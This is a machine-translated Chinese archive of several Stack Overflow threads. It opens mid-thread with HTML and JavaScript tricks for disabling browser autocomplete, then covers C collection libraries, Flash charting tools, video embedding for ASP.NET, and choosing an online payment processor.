 * Then, to prevent the entered text from being saved in the browser for a our new unique autocomplete, we replace it with the one set earlier when the field loses focus or when user press Enter key.
 * @type {{init: *}}
 */
var PreventFieldsAutofill = (function () {
    function init () {
        events.onPageStart();
    }

    var events = {
        onPageStart: function () {
            $(document).on('focus', 'input[autocomplete="off"], input[autocomplete="none"], input[autocomplete="false"]', function () {
                methods.replaceAttrs($(this));
            });
            $(document).on('blur', 'input[data-prev-autocomplete]', function () {
                methods.returnAttrs($(this));
            });
            $(document).on('keydown', 'input[data-prev-autocomplete]', function (event) {
                if (event.keyCode == 13 || event.which == 13) {
                    methods.returnAttrs($(this));
                }
            });
            $(document).on('submit', 'form', function () {
                $(this).find('input[data-prev-autocomplete]').each(function () {
                    methods.returnAttrs($(this));
                });
            });
        }
    };

    var methods = {
        /**
         * Replace value of autocomplete and name attribute for unique and save the original value to new data attributes
         * @param $input
         */
        replaceAttrs: function ($input) {
            var randomString = 'off-forced-' + Date.now();
            $input.attr('data-prev-autocomplete', $input.attr('autocomplete'));
            $input.attr('autocomplete', randomString);
            if ($input.attr('name')) {
                $input.attr('data-prev-name', $input.attr('name'));
                $input.attr('name', randomString);
            }
        },
        /**
         * Restore original autocomplete and name value for prevent saving text in browser for unique value
         * @param $input
         */
        returnAttrs: function ($input) {
            $input.attr('autocomplete', $input.attr('data-prev-autocomplete'));
            $input.removeAttr('data-prev-autocomplete');
            if ($input.attr('data-prev-name')) {
                $input.attr('name', $input.attr('data-prev-name'));
                $input.removeAttr('data-prev-name');
            }
        }
    };

    return {
        init: init
    }
})();
PreventFieldsAutofill.init();
```

```
.input {
  display: block;
  width: 90%;
  padding: 6px 12px;
  font-size: 14px;
  line-height: 1.42857143;
  color: #555555;
  background-color: #fff;
  background-image: none;
  border: 1px solid #ccc;
  border-radius: 4px;
}
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.0/jquery.min.js"></script>
<form action="#">
  <p>
    <label for="input-1">Firts name without autocomplete</label><br />
    <input id="input-1" class="input" type="text" name="first-name" autocomplete="off" placeholder="Firts name without autocomplete" />
  </p>
  <p>
    <label for="input-2">Firts name with autocomplete</label><br />
    <input id="input-2" class="input" type="text" name="first-name" autocomplete="given-name" placeholder="Firts name with autocomplete" />
  </p>
  <p>
    <button type="submit">Submit form</button>
  </p>
</form>
```

* * *

## 回答 #76

> 赞同：1
> 
> 时间：2020-01-17T12:59:09.170

只需尝试将值为“off”的属性自动完成设置为输入类型。

```
<input type="password" autocomplete="off" name="password" id="password" /> 
```

* * *

## 回答 #77

> 赞同：1
> 
> 时间：2020-08-09T20:21:00.893

```
<input type="text" name="attendees" id="autocomplete-custom-append">

<script>
  /* AUTOCOMPLETE */

  function init_autocomplete() {

    if (typeof ($.fn.autocomplete) === 'undefined') {
      return;
    }
    // console.log('init_autocomplete');

    var attendees = {
      1: "Shedrack Godson",
      2: "Hellen Thobias Mgeni",
      3: "Gerald Sanga",
      4: "Tabitha Godson",
      5: "Neema Oscar Mracha"
    };

    var countriesArray = $.map(countries, function (value, key) {
      return {
        value: value,
        data: key
      };
    });

    // initialize autocomplete with custom appendTo
    $('#autocomplete-custom-append').autocomplete({
      lookup: countriesArray
    });

  };
</script> 
```

* * *

## 回答 #78

> 赞同：1
> 
> 时间：2020-11-24T12:11:51.703

1.  将输入保留为文本类型并隐藏。
2.  在 DOMContentLoaded 上，调用更改密码类型并显示字段的函数，延迟为 1s。

```
document.addEventListener('DOMContentLoaded', changeInputsType);

function changeInputsType() {
    setTimeout(function() {
        $(/*selector*/).prop("type", "password").show();
    }, 1000);
}
```

* * *

## 回答 #79

> 赞同：1
> 
> 时间：2020-12-15T12:28:49.103

在尝试了所有解决方案之后（有些解决了部分问题，禁用了自动填充但没有自动完成，有些根本不起作用），我发现截至 2020 年的最佳解决方案是将 type="search" 和 autocomplete="off" 添加到您的输入元素。像这样：

```
<input type="search" /> or <input type="search" autocomplete="off" /> 
```

还要确保在表单元素上有 autocomplete="off"。这完美地工作并禁用自动完成和自动填充。

此外，如果您使用 type="email" 或任何其他文本类型，则需要添加 autocomplete="new-email" ，这将完全禁用两者。type="password" 也是如此。只需将“new-”前缀与类型一起添加到自动完成中。像这样：

```
<input type="email" autocomplete="new-email" />
<input type="password" autocomplete="new-password" /> 
```

* * *

## 回答 #80

> 赞同：1
> 
> 时间：2020-12-28T22:33:38.083

我已经在这里发布了一个解决方案：*[禁用 Chrome 自动填充信用卡](https://stackoverflow.com/questions/37595141/disable-chrome-autofill-creditcard/60664102#60664102)*

解决方法是将自动完成属性设置为“cc-csc”，该值是信用卡的[CSC](https://en.wikipedia.org/wiki/Card_security_code)，不允许存储它！（目前...）

```
autocomplete="cc-csc" 
```

* * *

## 回答 #81

> 赞同：1
> 
> 时间：2021-04-28T22:50:16.183

**每次只需将元素中的`name`属性更改为*唯一的属性，它就永远不会再次自动完成！*`input`**

 *一个例子可能是最后添加的时间 tic。您的服务器只需要解析文本的第一部分`name`来检索值。

```
<input type="password" name="password_{DateTime.Now.Ticks}" value="" /> 
```

* * *

## 回答 #82

> 赞同：1
> 
> 时间：2021-11-02T23:05:16.393

多年来，我一直在与这场永无止境的战斗作斗争......所有的技巧和黑客最终都停止工作，就好像浏览器开发人员正在阅读这个问题一样。

我不想随机化字段名称、触摸服务器端代码、使用大量 JS 技巧，并希望将“hacks”保持在最低限度。所以这就是我想出的：

**TL;DR**使用`input`不带`name`或`id`根本不带的！并在隐藏字段中跟踪更改

```
<!-- input without the "name" or "id" -->
<input type="text" oninput="this.nextElementSibling.value=this.value">
<input type="hidden" name="email" id="email"> 
```

显然，适用于所有主要浏览器。

PS已知的小问题：

1.  您不能通过`id`或`name`不再引用此字段。但是你可以使用 CSS 类。或者`$(#email').prev();`在 jQuery 中使用。或者想出另一个解决方案（有很多）。
2.  `oninput`当文本框值以编程方式更改时，`onchange`事件不会触发。因此，相应地修改您的代码以反映隐藏字段中的更改。

* * *

## 回答 #83

> 赞同：1
> 
> 时间：2021-11-22T11:56:22.200

要禁用表单中文本的自动完成功能，请使用 和 元素的 autocomplete 属性。您需要此属性的“关闭”值。

这可以以完整形式或特定元素的形式完成：

1.  将 autocomplete="off" 添加到元素上以禁用整个表单的自动完成功能。
2.  为表单的特定元素添加 autocomplete="off"。

**形式**

```
<form action="#" method="GET" autocomplete="off">
</form> 
```

**输入**

```
<input type="text" name="Name" placeholder="First Name" autocomplete="off"> 
```

* * *

## 回答 #84

> 赞同：0
> 
> 时间：2019-04-19T12:51:28.387

`name`您可以在表单的地址属性中添加名称`email`并生成电子邮件值。例如：

```
<form id="something-form">
  <input style="display: none" name="email" value="randomgeneratevalue"></input>
  <input type="password">
</form> 
```

如果您使用此方法，Google Chrome 将无法插入自动填充密码。

* * *

## 回答 #85

> 赞同：0
> 
> 时间：2020-06-26T10:56:44.380

就`autocomplete="off" list="autocompleteOff"`在您为 IE/Edge 完成的输入和工作中！并为镀铬添加`autocomplete="new password"`

* * *

## 回答 #86

> 赞同：0
> 
> 时间：2020-07-14T21:18:01.267

多年来，我一直在为自动完成而奋斗。我已经尝试了每一个建议，但对我没有任何帮助。通过 jQuery 2 属性添加效果很好：

```
$(document).ready( function () {
    setTimeout(function() {
        $('input').attr('autocomplete', 'off').attr('autocorrect', 'off');
    }, 10);
}); 
```

将导致 HTML

```
<input id="start_date" name="start_date" type="text" value="" class="input-small hasDatepicker" autocomplete="off" placeholder="Start date" autocorrect="off"> 
```

* * *

## 回答 #87

> 赞同：0
> 
> 时间：2020-08-04T09:58:28.270

这适用于 Chrome 84.0.4147.105

1.为密码字段分配文本类型并添加一个类，例如“fakepasswordtype”

```
<input type="text" class="fakepasswordtype" name="password1">
<input type="text" class="fakepasswordtype" name="password2"> 
```

2.然后在第一次输入完成时使用jQuery将类型改回密码

```
jQuery(document).ready(function($) {
    $('.fakepasswordtype').on('input', function(e){
        $(this).prop('type', 'password');
    });
}); 
```

这阻止了 Chrome 的自动填充令人讨厌的丑陋行为。

* * *

## 回答 #88

> 赞同：0
> 
> 时间：2021-05-13T20:09:03.690

Chrome 一直在尝试强制自动完成。因此，您需要做几件事。

输入字段的属性`id`，`name`不需要是可识别的。因此没有姓名、电话、地址等值。

相邻的标签或 div 也需要不可识别。但是，您可能想知道，用户如何知道？好吧，您可以`::after`使用`content`. 您可以将其设置为字母。

```
<label>Ph<span class='o'></span>ne</label>
<input id='phnbr' name='phnbr' type='text'>

<style>
  span.o {
    content: 'o';
  }
</style> 
```

* * *

## 回答 #89

> 赞同：0
> 
> 时间：2021-10-27T05:47:49.800

非常简单的解决方案只需更改标签名称和字段名称，而不是更通用的名称，例如：姓名、联系人、电子邮件。使用“邮寄至”而不是“电子邮件”。浏览器会忽略这些字段的自动完成功能。

* * *

## 回答 #90

> 赞同：0
> 
> 时间：2021-11-15T16:46:17.690

定义输入的属性 type="text" 以及 autocomplete="off" 足以为我关闭自动完成功能。

除了 type="password"，我尝试使用 JavaScript 挂钩 onfocus/onfocusout 事件从其他人的建议切换只读属性工作正常，但是当密码字段编辑开始为空时，自动完成密码再次出现。

除了上述工作良好的解决方法之外，我建议使用 JavaScript 挂钩 oninput 事件来切换关于密码长度的类型属性。

```
<input id="pwd1" type="text" autocomplete="off" oninput="sw(this)" readonly onfocus="a(this)" onfocusout="b(this)" />
<input id="pwd2" type="text" autocomplete="off" oninput="sw(this)" readonly onfocus="a(this)" onfocusout="b(this)" /> 
```

和 JavaScript ..

```
function sw(e) {
    e.setAttribute('type', (e.value.length > 0) ? 'password' : 'text');
}
function a(e) {
    e.removeAttribute('readonly');
}
function b(e) {
    e.setAttribute('readonly', 'readonly');
} 
```

* * *

## 回答 #91

> 赞同：0
> 
> 时间：2021-12-01T10:38:11.547

我在包含用户名和电子邮件输入字段的表单上遇到问题，其中电子邮件就在用户名之后。Chrome 会自动将我当前的站点用户名填充到电子邮件字段中，并将重点放在该字段上。这并不理想，因为它是一种将新用户添加到 Web 应用程序的表单。

似乎如果您一个接一个地有两个输入，其中第一个在其标签或 ID 中包含术语“用户名”或用户名，而下一个在其标签或 ID 中包含单词电子邮件，chrome 将自动填充电子邮件字段。

为我解决这个问题的方法是将输入的 ID 更改为不包含这些单词。我还必须将标签的文本设置为空字符串，并使用 javascript settimeout 函数将标签更改回 0.01 秒后的应有状态。

```
setTimeout(function () { document.getElementById('id_of_email_input_label').innerHTML = 'Email:'; }, 10); 
```

如果您在错误地自动填充任何其他输入字段时遇到此问题，我会尝试这种方法。

* * *

## 回答 #92

> 赞同：0
> 
> 时间：2022-02-04T03:38:48.260

```
<input autocomplete="off" aria-invalid="false" aria-haspopup="false" spellcheck="false" /> 
```

我发现它适用于所有浏览器。当我只使用自动完成功能时，它不起作用，除非我结合了您看到的所有属性。我也从谷歌表单输入字段中得到了解决方案

* * *

## 回答 #93

> 赞同：-1
> 
> 时间：2021-10-12T22:34:25.320

**不要使用 JAVASCRIPT 来解决这个问题！！**

首先使用 HTML 解决此问题，以防浏览器不使用脚本、无法使用您的脚本版本或关闭脚本。始终在 HTML 之上最后一层层编写脚本。

1.  对于具有“文本”类型属性的常规输入表单字段，`autocomplete="off"`在元素上添加 。由于用户浏览器覆盖设置，这在现代 HTML5 浏览器中可能不起作用，但它可以处理许多旧浏览器并在大多数情况下停止自动完成下拉选项。请注意，我还包括了所有其他可能会激怒用户的自动完成选项，例如`autocapitalize="off"`、`autocorrect="off"`和`spellcheck="false"`。许多浏览器不支持这些，但它们添加了额外的“关闭”功能，这些功能会惹恼数据输入人员。请注意，例如，如果用户的浏览器设置为启用， **Chrome 会忽略“关闭” 。**`autofill`所以，实现浏览器设置可以覆盖这个属性。

    <input type="text" id="myfield" name="myfield" size="20" value="" **autocomplete="off"** **autocapitalize="off"** **autocorrect="off"** **spellcheck="false"** tabindex="0 " placeholder="在这里输入一些东西..." title="输入一些东西" aria-label="Something" required="required" aria-required="true" />

2.  对于*用户名*和*密码*`autocomplete`字段，对于触发“关闭”功能的更具体的属性有一些有限的浏览器支持。`autocomplete="username"`用于登录的文本输入将强制某些浏览器重置并删除自动完成功能。`autocomplete="new-password"`将尝试做同样的事情用于使用“密码”类型输入字段的密码。（见下文）。但是，这些对特定浏览器来说是适当的，并且在大多数情况下都会失败。不支持这些功能的浏览器包括 Internet Explorer 1-11、许多 Safari 和 Opera 桌面浏览器，以及某些版本的 iPhone 和 Android 默认浏览器。但它们提供了额外的功能来尝试强制删除自动完成功能。

    <input type="text" id="username" name="username" size="20" value="" **autocomplete="username"** **autocapitalize="off"** **autocorrect="off"** **spellcheck="false"** tabindex="0 " placeholder="在此处输入用户名..." title="输入用户名" aria-label="用户名" required="required" aria-required="true" />

    <input type="password" id="password" name="password" size="20" minlength="8" maxlength="12" pattern="(?=. *\d)(?=.* [az]) (?=.*[AZ]).{8,12}" value="" **autocomplete="new-password"** **autocapitalize="off"** **autocorrect="off"** **spellcheck="false"** tabindex="0" placeholder="在此处输入密码..." title="输入密码：(8-12)个字符，必须包含一个数字，一个大写和小写字母" aria-label="Password" required="required" aria-required="true" />

**现在寻求更好的解决方案！**

由于标准机构和浏览器对 HTML5 的支持分裂，所有这些功能在许多现代浏览器和大多数旧浏览器中都失败了。因此，一些孩子转向编写脚本来填补漏洞。但那是懒惰的编程。**使用JavaScript**隐藏或重写 HTML会使事情变得更糟，因为您现在拥有层层的脚本依赖*以及*HTML 补丁。避免这种情况！

**在表单和字段中永久禁用此功能的最佳方法是**每次在“输入”元素上使用唯一值（例如与字段 ID 和名称连接的日期或时间）简单地创建自定义“id”/“name”值属性并确保它们匹配（例如“name=password_{date}”）。

```
<input type="text" id="password_20211013" name="password_20211013" /> 
```

这*破坏*了愚蠢的浏览器自动完成选择算法嗅探匹配的名称，触发这些字段的过去值。这样做，浏览器无法将以前表单数据的缓存与您的缓存相匹配。它将强制“自动完成”关闭，或显示一个空白列表，并且不会再显示任何以前的密码！在服务器端，您可以创建这些自定义输入“命名”字段，并且仍然可以通过简单地解析 id/name 的第一部分来识别并从来自用户浏览器的响应中提取正确的字段。例如“password_”或“username_”等。当输入字段的“name”值时，您只需解析第一部分（“password_{date}”）并忽略其余部分，然后在服务器上提取您的值。简单的！****

# c - 良好的 C 类 STL 库

> ID：2540
> 
> 赞同：48
> 
> 时间：2008-08-05T16:30:37.377
> 
> 标签：c, architecture, data-structures

具有向量、双端队列、堆栈、哈希图、树形图、集合等数据结构的 C 语言库有哪些好的？请使用纯 C，并且与平台无关。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2008-08-05T18:50:09.453

Gnome 项目上使用的[Glib](http://library.gnome.org/devel/glib/stable/)库也可能有一些用处。此外，它经过了很好的测试。

IBM developerworks 有一个很好的使用教程：[Manage C data using the GLib collections](https://www.ibm.com/developerworks/linux/tutorials/l-glib/)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-08-05T16:43:11.033

与往常一样，Google 是您的朋友：

[http://nixbit.com/cat/programming/libraries/c-generic-library/](http://nixbit.com/cat/programming/libraries/c-generic-library/)

具体来说：

[http://nixbit.com/cat/programming/libraries/generic-data-structures-library/](http://nixbit.com/cat/programming/libraries/generic-data-structures-library/)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-09-01T01:56:18.747

[Apache Portable Runtime](http://apr.apache.org/ "Apache 便携式运行时") (APR) 中有一些东西，我希望它们非常可靠。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-07-01T16:27:39.527

也许[http://sglib.sourceforge.net/](http://sglib.sourceforge.net/)如果你想要一个易于使用、非常快速、基于宏的库。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-11-21T09:07:48.987

如果哈希表、可扩展字符串和动态向量足以满足您的需求，请查看我放在一起的库：[http](http://code.google.com/p/c-libutl/) ://code.google.com/p/c-libutl/ 。

我也欢迎任何反馈！

# flash - 闪存图表和图形的最佳解决方案是什么？

> ID：2543
> 
> 赞同：16
> 
> 时间：2008-08-05T16:34:37.057
> 
> 标签：flash, graph

我知道[FusionCharts](http://www.fusioncharts.com/)，还有其他好的解决方案或 API 可以在 Adob​​e Flash 中创建图表吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-08-05T16:54:48.357

[http://teethgrinder.co.uk/open-flash-chart/](http://teethgrinder.co.uk/open-flash-chart/)看起来真的很甜蜜。我建议你看看。

更新：Open Flash Chart 2 已发布：[http ://teethgrinder.co.uk/open-flash-chart-2/](http://teethgrinder.co.uk/open-flash-chart-2/)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-08-26T18:11:48.013

根据您的需要，您可能会查看其他几个：

**耀斑**

[![耀斑](../Images/3795e81eaa8ac247b0820eb79360504e.png)](http://flare.prefuse.org/demo)

**预熔**

[![前置](../Images/351e29f9ad05dbc45bbd373267eed3b4.png)](http://prefuse.org/)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-08-05T16:49:06.047

你有理由在 Flash 中使用它吗？如果可以使用普通的旧 PNG，请尝试使用[Google Chart API](http://code.google.com/apis/chart/)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-09-24T07:52:30.620

我认为最好的 Flash 图表是[amCharts](http://www.amcharts.com) - 外观漂亮、高度可定制且免费（如果您不介意返回 amcharts.com 的链接）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-08-05T16:36:43.933

XML/SWF Charts 会关闭 XML 图表：

[http://www.maani.us/xml_charts/](http://www.maani.us/xml_charts/)

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-08-05T16:40:37.840

我知道你说的是 flash，但这是一个很好的 silverlight 图表 api。[http://www.visifire.com/](http://www.visifire.com/)。让您的选择保持开放总是好的吗？

不得不插入silverlight，但你也可以看看[Yahoo! 的YUI 图表](http://developer.yahoo.com/yui/charts/)组件。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-02T09:11:58.340

[open-flash-chart](http://teethgrinder.co.uk/open-flash-chart-2/)因为您无法调整 .png 的大小并且 .png 没有工具提示。另外，您为什么要将所有数据发送给谷歌？你就这么信任他们吗？

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-08-05T16:53:15.647

我可以保证我在[PHP/SWF 图表](http://www.maani.us/charts/index.php)（以及 XML/SWF 图表）方面有很好的经验。创建非常微妙的图表效果很容易。饼图一次一层地淡出，看起来相当专业，而且不会让人讨厌。

编辑：从头开始，[Open-Flash-Chart](http://teethgrinder.co.uk/open-flash-chart/)看起来好多了。我收回我的建议。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2010-08-24T02:58:34.047

Adobe 的数据可视化包现在在 Flash Builder 4 发布后免费。

图表和其他库在此站点上 - [http://opensource.adobe.com/wiki/display/flexsdk/Download+Flex+4](http://opensource.adobe.com/wiki/display/flexsdk/Download+Flex+4)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2011-11-24T10:06:52.123

MultiChart，因为它在所有参数上都优于其他所有图表。 [http://chart.sqlcode.org](http://chart.sqlcode.org)

# asp.net - 在 ASP.NET 网站中嵌入视频的有效选项有哪些？

> ID：2550
> 
> 赞同：18
> 
> 时间：2008-08-05T16:39:04.507
> 
> 标签：asp.net, flash, video, embed

快速浏览一下当今的互联网似乎表明 Adob​​e Flash 是在网页中嵌入视频的明显选择。这是准确的，还是其他有效的选择？选择 ASP.NET 作为平台会影响这个决定吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2008-08-05T16:44:01.157

Flash 无疑是最普遍和便携的解决方案。 [98% 的浏览器](http://en.wikipedia.org/wiki/Adobe_Flash#Market_share)都安装了 Flash。其他替代品是[Quicktime](http://www.apple.com/quicktime/download/)、[Windows Media Player](http://www.microsoft.com/windows/windowsmedia/default.mspx)，甚至是[Silverlight](http://silverlight.net/)（微软的 Flash 竞争对手，可用于嵌入多种视频格式）。

我建议您使用 Flash（它是 FLV 视频文件格式）来嵌入您的视频，除非您对视频质量或 DRM 有非常具体的要求。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-08-05T16:44:43.090

Flash 通常是首选产品：每个人都有它，使用[JW FLV 播放器](http://www.jeroenwijering.com/?item=JW_FLV_Media_Player)可以让您相对轻松。

至于其他视频格式，有 WMV 和 QuickTime，但播放器比较“重”，不是每个人都可能拥有它们，而且感觉很 1990...

真正的玩家……别让我开始抱怨那一堆……

我个人认为的唯一另一种 Flash 替代品是 Silverlight，它允许流式传输 WMV 视频。我发现 WMV 的生成比 FLV 更好、更容易，因为我尝试过的所有 Windows FLV 编码器都不是很好也不是很稳定，而几乎每个工具都可以原生输出 WMV。Silverlight 的问题是没有人拥有那个浏览器插件（还没有？）。[JW](http://www.jeroenwijering.com/?item=JW_WMV_Player)还有一名球员。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-08-23T20:03:56.553

一个考虑因素是视频播放是通过渐进式下载还是流式传输。如果它是渐进式下载，那么我会说使用 Flash，因为您可以获得更广泛的受众。

[对于流式 wmv，它是Windows Media Services](http://www.microsoft.com/windows/windowsmedia/forpros/server/server.aspx)提供的开箱即用功能

对于流式闪存，您必须在 Windows 机器上安装流式服务器。一些选项是：

*   [Adobe Flash 媒体服务器](http://www.adobe.com/products/flashmediaserver)（商业）
*   [Wowza 媒体服务器](http://www.wowzamedia.com/products.html)（免费/商业）
*   [Red5 Flash 服务器](http://osflash.org/red5)（开源）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-28T17:42:14.700

```
<object width="660" height="525"><param name="movie" value="http://www.youtube.com/v/WAQUskZuXhQ&hl=en&fs=1&color1=0x006699&color2=0x54abd6&border=1"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/WAQUskZuXhQ&hl=en&fs=1&color1=0x006699&color2=0x54abd6&border=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="660" height="525"></embed></object> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-06-10T15:11:34.053

如果您有权访问 Microsoft Expression Encoder 2，则可以使用它来编码视频文件并生成 Silverlight 视频播放器。然后，如果您有 IIS 7，则可以使用 Adaptive 或[Smooth Streaming](http://www.iis.net/extensions/SmoothStreaming)也可以查看[Smooth HD](http://www.smoothhd.com)以获得一个非常酷的示例。

您还可以从免费的[Microsoft Silverlight Streaming Service](http://silverlight.live.com/)进行流式传输。它已连接到 Windows Live 帐户。

需要考虑的是客户端需要安装 Silverlight，就​​像 Flash 一样，但 Flash 的存在时间更长。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-08-05T16:49:31.723

我曾在一家公司工作，该公司开发了一种将媒体内容分发给专门的“玩家”的系统。它是基于 Web 并使用 ASP.NET 技术的，并且尝试了几乎所有您能想到的可能的媒体格式，而您的选择实际上归结为问自己：

它需要直接开箱播放，还是我可以确保可以预先安装播放视频所需的组件？

如果您的答案是它需要开箱即用，那么您唯一的选择就是 flash（我知道默认情况下没有安装它，但大多数人已经安装了它）

如果需要额外的组件不是一个大问题，那么您可以使用 windows 媒体播放器支持的格式

windows media player 之所以属于第二种选择，是因为对于某些浏览器和某些格式，必须安装额外的组件。

我们拥有“播放器”由我们提供的奢侈，所以我们可以选择第二种选择，但即使我们尝试[尽可能多地转换](http://ffmpeg.mplayerhq.hu/)回闪存，因为它比 windows media player 处理方式更好

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-28T17:48:33.440

“选择 ASP.NET 作为平台会影响这个决定吗？”

**可能不是。**

# payment - 什么是最好的在线支付处理解决方案？

> ID：2556
> 
> 赞同：93
> 
> 时间：2008-08-05T16:41:50.413
> 
> 标签：payment

应该适用于非美国公司，易于设置，可靠，便宜，可定制等。您的经验是什么？

* * *

## 回答 #1

> 赞同：98
> 
> 时间：2008-09-19T09:37:18.453

你不能用“我喜欢'在此处插入提供名称'”类型的答案来回答这类问题，因为就像很多事情一样，它是一种平衡，选择支付处理解决方案的原因往往很复杂。

## 数量/价值

选择安全的支付清算服务（将连接到银行网络并为您清算资金的人 - 将他们称为 SPCS）的最重要因素是您将以何种成本销售多少小部件。所有 SCPS 提供商的定价模型都基于此等式。这决定了使用服务的经济性，而这几乎总是最重要的因素。

例如，在英国，[securetrading.net](http://securetrading.net)的年费很高，最低交易额也很高（我已经有一段时间没有看到确切的数字了，他们并没有在网站上立即显示出来，但这只是为了说明无论如何）使它成为最昂贵的解决方案之一，*如果*您销售高价值小批量。大多数较小的客户都属于这种模式。高价值实际上超过几美元。小批量通常是每月少于数万个单位。*但是*，如果您在国际环境灾难（相对较低的价值*非常*高的数量）之后运行捐赠服务，那么它们将成为最便宜的服务之一。

考虑到设置成本（相对较高）以及将服务绑定到站点的成本（在 SecureTrading 的情况下，这很容易做到，但仍然比添加 PayPal 按钮要困难得多），然后您开始建立一个真实的画面。

另一方面，像[PayPal](http://www.paypal.com)这样的服务具有非常低的设置成本（无需支付任何费用，并且非常容易集成），但交易成本相对较高。它非常适合高价值/小批量交易。

## 银行

支付清算服务主要有两类 - Bureau 和 Bank Acquired。

在英国，至少[NetBanx](http://www.netbanx.com)、[SecureTrading](http://www.securetrading.net)和[WorldPay](http://www.worldpay.com)提供银行收购和局服务。[ProtX](http://www.protx.com)和[SecPay](http://www.secpay.com)仅提供银行收购的服务。PayPal 及其同类产品的运作略超出这两个定义（请参阅下面的保护）。

银行获得的服务会进入您的普通银行商家账户并将资金直接清入其中。除了向您收取这项服务的费用外，您的银行也会分一杯羹，通常这比 SPCS 提供商收取的费用要多，因此实际上是*银行*成为了决定性因素。

一些银行只会与他们首选的供应商合作。在英国，大多数银行都希望您拥有一个单独的 Internet Merchant Account *，即使*您已经拥有他们的 Merchant Account。

我总是告诉客户货比三家，因为这将对他们的电子商务企业可以带来多少产生巨大影响。所有银行都不是生来平等的。

局服务在提供清关服务的同时有效地充当您的银行。他们在银行还没有掌握互联网概念的时代流行起来，如果他们得逞的话，他们宁愿把交易凿成石碑。通常根据情况为您选择局服务和银行获得的服务。

### 交易历史

在许多国家（包括英国），大多数银行在您进行特定交易一段时间（在英国为 2 年）之前不会为您提供商家账户。您唯一的选择就是局服务。

### 现金周转

大多数局服务将保留您的现金作为“拒付”的担保。

如果你卖给我一辆法拉利，我惊恐地得知你卖给我的是一个小金属玩具，而不是我所期待的 1.5 吨意大利汽车激情，我会向我的信用卡公司投诉，他们会退款给我，然后追逐您的商家服务提供商退款。他们将不得不给他们退款，然后追逐你的钱。

因此，将您的钱保留 4-6 周以防止这种情况发生符合他们的利益。如果您在没有资本支出的情况下出售服务或商品（例如软件），那么您可以负担得起。另一方面，如果您确实需要向您的豪华汽车进口商付款以向您提供库存，那么现金流就变得非常重要，您将需要银行获得的服务，以便您可以立即获得付款。

## 保护

PayPal 和类似服务的一个主要缺点是它不受管理信用卡的相同法规的约束。

简而言之，如果您使用信用卡购买商品，您的信用卡供应商有责任确保您得到所付的款项（一般而言，在大多数国家/地区，这并不构成法律建议等），如果您在购买时遇到问题，他们将负责会很快退款给你，然后会去追你付钱的人。

当 Leo Laporte 在他的播客上为美国运通做广告时，你会听到这种保护。这是一个“好东西”TM。PayPal 没有这种保护，因为当您在 PayPal 上使用信用卡时，您实际上是在购买 PayPal 的服务。因此，即使您错售了产品，您支付服务费用的人 (PayPal)*也没有*错售，他们提供了您支付的服务。这打破了链条。

PayPal 没有以同样方式保护您的法律义务，而且他们在退还被骗客户方面的记录也不多。我猜他们总部的墙上写着“Caveat Emptor”。:)

我不是在贬低 PayPal，它们在许多其他安全功能上都处于领先地位，但这只是另一个需要牢记的因素。

## 端到端集成

不同的服务在易于集成方面有所不同。哦，男孩，他们有什么不同。我现在正在做一些工作来进行汇丰整合。我宁愿做根管。有些系统对您必须使用它们的方式做出了很大的假设，并且设计不佳或不灵活。将它们重新安装到活动站点可能会非常痛苦。其中一些很漂亮并且易于使用（并且不一定不太安全）。最大的区别是您如何选择集成。

大多数服务通过允许您重定向到您的客户填写他/她的详细信息的安全站点来集成。他们最终被重定向回您自己网站上的页面，其中包含交易结果。这在大多数情况下效果很好，并且最容易集成。

但是，当您在亚马逊上购买商品时，您不会被重定向到 WorldPay 或 PayPal。如果您想要端到端集成，现在大多数服务都会让通信在幕后进行。当然，您自己的站点必须有一个像样的安全服务器证书，而且集成必然更加复杂。

## 名声

过去，PayPal 被用在极小的网站上。你不会用它赶上亚马逊。这种看法发生了很大变化，事实上，从某种意义上说，PayPal 的安全性比大多数人都好。如果您的受众希望看到 PayPal，而您为他们提供了一些其他服务，那么您可能会失去自定义，反之亦然。如今，许多商家为客户提供选择。

## 英国供应商

*   [世界支付](http://www.worldpay.com)。成立良好。局和银行收购。交易成本和年度成本相对较高。相当容易集成。最终归苏格兰皇家银行所有。
*   [安全支付](http://www.secpay.com)。银行收购。单笔交易成本低，年成本低，支付模式灵活。
*   保护[X。](http://www.protx.com)银行收购。低单笔交易成本和低年成本，灵活的支付模式。可能对整合要求很高。
*   [汇丰银行](http://www.hsbc.com)。银行收购。每笔交易成本低。高昂的设置和年度成本。集成起来非常不灵活。
*   [安全交易](http://www.securetrading.net)。局和银行收购。每笔交易成本低，但设置和年度成本高。上次我使用它时集成起来很容易（9年前！）
*   [网银](http://www.netbanx.com)。局和银行收购。自 1996 年以来未使用过，因此无法发表评论！

当然[PayPal](http://www.paypal.com)、[Google Checkout](http://checkout.google.com)和[Amazon FPS](http://aws.amazon.com/fps/)都非常值得一看，而且它们自己也值得一个完整的答案！

## 概括

告诉你没那么简单！通常，作为开发人员，我们无法为自己选择，这些决定应该由我们的雇主/客户的业务需求驱动。

大多数电子商务项目都会从 PayPal 或类似项目开始。当企业获得足够的订单，他们可以通过切换到另一项服务来节省资金时，他们就有足够的钱来支付切换费用。

